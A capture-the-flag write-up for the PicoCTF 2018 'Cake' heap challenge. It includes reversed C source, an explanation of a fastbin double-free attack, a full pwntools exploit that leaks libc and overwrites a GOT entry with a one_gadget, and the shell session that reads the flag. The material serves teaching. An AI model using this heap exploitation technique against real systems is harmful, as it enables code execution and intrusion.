## PicoCTF 2018 Cake - Points: 900 - (Solves: 18)

Now that you're a professional heap baker, can you pwn this for us? It should be a piece of cake. Connect with nc 2018shell2.picoctf.com 42542. libc.so.6
Hints: 
If at first you don't succeed, try, try, try again.
Make sure you are run/debug with the provided libc on the shell server

The program is simple enough, it lets us make cakes given a name and a price, then lets us serve a customer our cake, and adds the price of our cake to the shops profit. The number of customers is randomly incremented.

I started off by reversing the whole thing. Had this been a shorter CTF, i would have just rushed to find a vuln, but I had time to understand it more.

```C
struct cake {
	long price;
	char name[8];
};

struct shop {
	unsigned long profit;
	unsigned long customers;
	struct cake *counter[16];
};

struct shop shop;


/*Eat the rest of buffered input until newline*/
void eat_line()
{
	char c;
	while ((c=fgetc(stdin)) != -1 && c != 0xa);
}

/*Fill buffer with size bytes from stdin*/
void fgets_eat(char *buf, int size)
{
	if (!fgets(buf, size, stdin)) {
		char * end = strchr(buf, 0xa);
		if (!end) *end = 0;
	}
}

/*get unsigned long from stdin*/
unsigned long get()
{
	unsigned long v10 = 0;
	scanf("%lu", &v10);
	return v10;
}


/*Serve function, this is where vulnerability is UAF and double free*/
void serve(struct shop *shop)
{
	printf("This customer looks really hungry. Which cake would you like to give them?\n");
	unsigned long idx = get();
	if (idx > 0xf || !shop->counter[idx]) {
		printf("Oops! You reach for a cake that isn't there yet.\n");
		return;
	}
	printf("The customer looks really happy with %s\n", shop->counter[idx]->name);
	shop->profit += shop->counter[idx]->price;
	free(shop->counter[idx]);
	shop->customers--;
}

void inspect(struct shop *shop)
{
	printf("Which one?\n");
	long idx = get();
	if (idx > 0xf || !shop->counter[idx]) {
		printf("You didn't make the cake %lu yet\n", idx);
		return;
	}
	printf("%s is being sold for %lu\n", shop->counter[idx]->name, shop->counter[idx]->price);
}


/*Make a cake*/
void make(struct shop *shop)
{
	int idx = 0;
	while (idx <= 0x10) {
		if (idx == 0x10) {
			printf("Ran out of counter space\n");
			return;
		}
		if (shop->counter[idx]) {
			idx++;
			continue;
		}
		printf("Making the cake\n");
		shop->counter[idx] = malloc(sizeof(struct cake)); /*cake has size 0x10*/
		if (!shop->counter[idx]) {
			printf("malloc returned NULL. Out of memory\n");
			exit(1);
		}
		printf("Made cake %d.\nName> ");
		fgets_eat(shop->counter[idx]->name, 8);
		printf("Price> ");
		shop->counter[idx]->price = get();
		break;
	}
}

int main()
{
	alarm(0xb4);
	setbuf(stdout, NULL);
	srand(0x2df);
	//print cake ascii art
	while (1) {
		int v = rand();
		int v8 = ((v*0x55555556)>>32) - (v << 31);
		if (!v8) shop.customers++;

		char c = fgetc(stdin)
		switch (c) {
			case 'M': make(&shop); break;
			case 'I': inspect(&shop); break;
			case 'S': serve(&shop);
			case 'W': printf("Twiddling thumbs\n");
		}
	}
	return 0;

}

```

After doing this I noticed several things:
* The serve function will free a cake, but not set it to NULL which gives us a double free vulnerability
* The inspect will inspect any cake, regardless of if it is free or not.

The only items malloc'd in this program are cakes, and they are of static size (0x10, which is of fastbin size), which makes this challenge more difficult. I had originally been thinking of a fastbin attack to overwrite malloc_hook, but without controlling the size of the free'd fastbin , I did not know of a way to forge a chunk near malloc_hook. We do however, control the global variable shop, and we can directly set the profit variable which is at the start of the shop struct.

I started out with first trying to leak libc. To do this I recognized we could do a fastbin attack and take control of the shop variable in the BSS section. For those unaware of the fastbin vulnerability, I will briefly go over it, but there are various online guides that cover it better.

Malloc'd chunks of fastbin size have this approximate structure:
```
chunk addr->  ********************************
              * prev_size       | size & flags*
mem addr->    ********************************
              *   user controlled space      *
              ******************************** 
next chunk->  * next chunk size              *          
```
However when they are free'd the pointer to the next chunk is set at the beginning of the user controlled space.

Fastbin attacks work by exploiting the fastbin freelist. The glibc allocator has 10 linked list pointers or "bins" for chunks of fastbin size. Everytime a fastbin chunk is free'd, it will be put as the HEAD of the corresponding fastbin, and the first 8 bytes of the allocated part of the chunk will be set as a pointer the the next chunk in the list.
If we can overwrite the pointer to the next chunk, we can control the address returned by a malloc.
The only security check we have to worry about is that our fake chunk has a size&flags that would put it in the same bin as the chunk we are overwriting. Otherwise the error``` malloc(): memory corruption (fast) ``` will be thrown.

Ok so one way to overwrite the next pointer is by having a double free in your program. The double free exploit is much
simpler than the fastbin. If we free a chunk twice, then it will be returned by malloc twice, or it will be returned once,
but still be on the fastbin linked list. The only security check right now to get around this is making sure that the chunk
we are freeing twice is not the HEAD of its fastbin list. To bypass this, we just have to free a different chunk of the same
size between the 1st and 2nd free.

Our plan of action is to get the shop global variable returned by malloc. To do this we can forge use shop->profit as the chunks->size which means that we need to set it the same as our other chunks. (0x10 of usable size + 0x10 header + in_use flag set means the size is 0x21). So if we set the profit to 0x21 (33) then double free a chunk, overwite its next ptr with &shop-0x8 then malloc will return &shop+0x8 or at the customers value. We then can control shop->customers and shop->counter\[0].

I started writing a python exploit to do this (I will show the full source at the end):
```python
    shop = 0x6030e0 # this is the address of the shop struct in the bss section
    A = alloc(p, "", 16) #Set the price to 16
    B = alloc(p, "", 17) # set the price to 17
    free(p, A) # A->next NULL, A = fastbin freelist top
    free(p, B) # B->next = A, B = fastbin freelist top
    free(p, A) # A->next = B, A = fastbin freelist top
    # overwrite A->next with fake chunk before shop. (set shop->price and fchunk size)
    C = alloc(p, "", int(shop-0x8))
```
Then we get it returned by malloc by repeatedly getting malloc to return the fastbin HEAD by allocating more cakes.
Our goal right now is to leak libc, so lets overwrite the shop->counter\[0] with the address of the printf got entry

```python
    p_plt = 0x603048 # &printf.got
    D = alloc(p, "", 0) # next malloc returns B
    E = alloc(p, "", 0) # this alloc returns A
    # Next alloc returns shop+0x8. Overwrite customers with shop-0x8 and counter[0] with got addr
    F = alloc(p, struct.pack("L", p_plt), 0)
```
We can now inspect the first, cake, and the price variable will be the printf got entry!
```
pÒM is being sold for $139972221822976
[*] libc base is at: 0x7f4dd28a1000
```
Now that we have leaked libc, we have to find a way to write a value somewhere that will redirect code execution. Without controlling the size of our chunks, we only can use a fastbin attack to return places that have a fastbin size the same as 0x21. Hmm... We already control the shop, can we maybe use that to write somewhere?
Lets look at the make function again:
```C
void make(struct shop *shop)
{
	int idx = 0; 
	while (idx <= 0x10) {
		if (idx == 0x10) {
			printf("Ran out of counter space\n");
			return;
		}
		if (shop->counter[idx]) {
			idx++;
			continue;
		}
		printf("Making the cake\n");
		shop->counter[idx] = malloc(sizeof(struct cake)); /*cake has size 0x10*/
		if (!shop->counter[idx]) {
			printf("malloc returned NULL. Out of memory\n");
			exit(1);
		}
		printf("Made cake %d.\nName> ");
		fgets_eat(shop->counter[idx]->name, 8);
		printf("Price> ");
		shop->counter[idx]->price = get();
		break;
	}
}
```
Well the counter\[idx] is dereferenced twice, is it possible for us to change the value of it between dereferences? We already can control counter\[0]. If we can get
```fgets_eat(shop->counter[0]->name, 8);``` to overwrite ```counter[0]``` with our target address, then ```shop->counter[0]->price = get();``` gives us arbitrary write. 

The requisites to do this are:
* The make function requires that counter\[idx] be NULL otherwise we can't overwrite it.
* counter\[0]->name must point to counter+0

Ok one problem. Our fastbin attack lets us overwrite the first counter index, but for our idea to work we have to set it to
NULL, then get malloc to return the counter. Given that the make() function uses up the first space that is open, during
the course of our fastbin attack, counter\[0] will always be used. Are we out of luck? 

Not quite, we just need to get shop+0x8 returned by malloc twice in a row. To do this, we can set the next pointer in our original forged chunk, back to the forged chunk. Then we can do another fastbin attack, get shop+0x8 overwritten setting shop->counter\[0] to NULL, and our next call to malloc will return shop+0x8 again, with shop->counter\[0] as NULL, and we can finish our attack.


Putting it all together:
```python
#!/bin/python2
from pwn import *
import re

context.terminal = ["termite", "-e"]
cidx = 0

def alloc(p, name, price):
    p.sendline("M")
    p.sendlineafter("Name>", name)
    p.sendlineafter("Price>", str(price))
    global cidx
    cidx = cidx + 1
    return cidx - 1

def free(p, i):
    p.sendline("S")
    p.sendlineafter("This customer looks really hungry. Which cake would you like to give them?", str(i))
    p.recvuntil("The customer looks really happy with !")

def leak(p, i):
    p.clean()
    p.sendline("I")
    p.sendlineafter("Which one?", str(i))
    leak = p.recvline_contains("is being sold for")
    leak = leak.split('$')[-1]
    return int(leak)

def break_heap():
    global cidx
    p = remote('2018shell2.picoctf.com', 42542)
    #p = process(['/home/mithreindeir/picoctf/ld-linux-x86-64.so.2', '/home/mithreindeir/picoctf/cake'], setuid=False, env={"LD_PRELOAD":"./libc.so.6"})
    '''
        Fastbin freelist attack to control the counter array,
        change pointer in counter array to @plt function, leak libc
        overwrite entry in counter array during buffer write, then the 2nd time its
        dereferenced in same function it will be pointing at a got entry, and can be
        overwritten with a call to gets

        reqs:
        make() with idx = 0
        malloc will return &shop
        overwite counter[0] with got entry
        counter[0] is dereferenced to set the price variable
    '''
    '''
    set customers to 0x21 so we can control more of the array,
    and so that it is a valid chunk
    '''
    shop = 0x6030e0 #address of shop struct
    p_plt = 0x603048 # &printf.got
    p_off = 0x55800 # offset from libc base to printf
    one_gadget = 0x45216 # magic one gadget

    A = alloc(p, "", 16)
    B = alloc(p, "", 17)
    free(p, A) # A->bk NULL, A = fastbin freelist top
    free(p, B) # B->bk = A, B = fastbin freelist top
    free(p, A) # A->bk = B, A = fastbin freelist top
    # overwrite A->bk with fake chunk before shop. (set shop->price and fchunk size)
    C = alloc(p, "", int(shop-0x8))

    D = alloc(p, "", 0) # next malloc returns B
    E = alloc(p, "", 0) # this alloc returns A
    # Next alloc returns shop+0x8. Overwrite customers with shop-0x8 and counter[0] with got addr
    F = alloc(p, struct.pack("L", p_plt), int(shop-0x8))

    # Libc leak from dereferencing overwritten counter[0]
    libc = leak(p, 0) - p_off
    log.info('libc base is at: ' + hex(libc))
    # Next step is redoing step 1) except now the forged chunk->fd will point to shop-0x8
    # Then we will NULL out counter[0]
    # The following address will be shop-0x8 which means counter[0]->name will overwrite counter[0]
    # And we can get an arbitrary write primitive

    #you know the drill
    free(p, D) # D->bk NULL, D fastbin freelist head
    free(p, E) # E->bk NULL, E fastbin freelist head
    free(p, D) # D->bk = E, D fastbin freelist head
    # overwrite D->bk with fake chunk before shop
    G = alloc(p, "", int(shop-0x8))

    H = alloc(p, "", 0) # this malloc returns E
    I = alloc(p, "", 0) # this malloc returns D
    J = alloc(p, struct.pack("L", 0), 0) # this malloc returns shop+0x8
    K = alloc(p, struct.pack("L", p_plt), libc + one_gadget)

    p.interactive()

break_heap()
```

Lets try it out:

```bash ./cake_exploit.py
[+] Opening connection to 2018shell2.picoctf.com on port 42542: Done
[*] libc base is at: 0x7fdcc7a8d000
[*] Switching to interactive mode
 $ id
uid=1122(cake_1) gid=1123(cake_1) groups=1123(cake_1)
$ ls
cake
flag.txt
libc.so.6
xinet_startup.sh
$ cat flag.txt
picoCTF{h4v3_y0ur_c4k3_4nd_s311_1t_t00_flhcejwu}
$ 
[*] Closed connection to 2018shell2.picoctf.com port 42542

```
